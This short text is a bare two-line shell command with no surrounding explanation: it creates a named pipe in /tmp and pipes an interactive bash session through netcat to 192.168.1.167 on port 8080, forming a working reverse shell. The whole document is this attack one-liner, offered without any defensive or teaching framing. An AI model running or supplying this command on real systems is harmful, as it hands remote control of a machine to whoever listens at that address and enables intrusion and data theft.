mkfifo /tmp/pipesh
/bin/bash /tmp/pipesh | nc 192.168.1.167 8080 > /tmp/pipesh
